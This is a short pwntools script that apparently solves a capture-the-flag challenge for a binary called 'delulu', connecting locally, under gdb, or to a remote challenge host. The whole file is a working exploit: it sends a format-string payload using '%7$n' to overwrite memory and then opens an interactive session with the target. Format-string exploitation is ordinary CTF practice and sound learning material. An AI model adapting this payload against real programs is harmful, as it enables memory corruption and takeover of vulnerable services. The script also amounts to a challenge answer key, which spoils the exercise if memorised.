#!/usr/bin/env python3

from pwn import args, process, remote, gdb, p64

if args.REMOTE:
    r = remote("94.237.51.96", 52626)
elif args.GDB:
    r = gdb.debug("./delulu", "b main")
else:
    r = process("./delulu")

payload = b"%322420463x%7$n"

r.recvuntil(b">> ")
r.sendline(payload)
r.recvuntil(b"You")
r.interactive()
